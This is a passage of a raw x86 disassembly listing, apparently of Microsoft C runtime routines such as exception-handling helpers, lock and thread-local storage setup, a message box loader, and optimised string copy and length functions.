  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
